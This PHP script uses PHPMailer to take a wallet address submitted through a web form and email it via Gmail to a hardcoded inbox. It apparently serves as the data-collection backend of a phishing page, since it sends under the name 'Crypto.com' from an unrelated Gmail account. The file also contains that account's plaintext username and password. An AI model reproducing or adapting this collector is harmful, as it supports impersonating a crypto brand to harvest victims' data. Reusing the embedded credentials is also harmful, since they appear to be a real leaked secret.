<?php
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require './vendor/autoload.php';


$mail = new PHPMailer(true);                              // Passing `true` enables exceptions
try {
    //Server settings
    $mail->isSMTP();                                      // Set mailer to use SMTP
    //$mail->SMTPDebug = 1;                                 // Enable verbose debug output
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
    $mail->Host = "smtp.gmail.com";                       // Specify main and backup SMTP servers
    $mail->Port = 465;                                    // TCP port to connect to
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Username = '15cdcmanager0@gmail.com';                 // SMTP username
    $mail->Password = '=coinmarketcap1';                           // SMTP password
    $mail->Subject = 'Test Email';

    //Recipients
    $Address = $_POST["Address"];
    $mail->setFrom('15cdcmanager0@gmail.com', 'Crypto.com');
    $mail->addAddress('15cdcmanager0@gmail.com', '15cdcmanager0');     // Add a recipient

    //Content
    $mail->Body    = "
    <b>User's Wallet Address:</b> 
    <p>$Address</p>
    ";
    $mail->send();
    // echo 'Message has been sent';
} catch (Exception $e) {
    echo 'Message could not be sent. Mailer Error: ', $mail->ErrorInfo;
}
